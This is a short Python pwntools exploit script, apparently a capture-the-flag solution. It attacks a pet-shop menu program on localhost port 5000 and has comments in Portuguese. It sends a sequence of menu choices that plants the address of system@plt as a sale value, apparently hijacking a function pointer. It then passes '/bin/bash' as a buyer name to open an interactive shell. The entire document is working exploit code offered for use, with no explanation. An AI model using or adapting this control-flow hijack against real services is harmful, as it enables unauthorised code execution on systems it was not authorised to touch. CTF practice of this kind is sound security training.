from pwn import *

conn = remote("localhost", 5000)
#conn = process("../../public/run")
#context.terminal = ["alacritty", "-e", "bash", "-c"]
#gdb.attach(conn)

plt_system = 0x401060

conn.sendline(b'1')  # Criar cachorro
conn.sendline(b'4')  # Vender animal
conn.sendline(b'0')  # índice do animal a ser vendido
conn.sendline(b'Zezinho lokao da OHM')  # Nome do comprador
conn.sendline(b'%d' % plt_system)  # Valor da venda
conn.sendline(b'4')  # Vender animal
conn.sendline(b'0')  # índice do animal a ser vendido
conn.sendline(b'/bin/bash')  # Nome do comprador

conn.interactive()
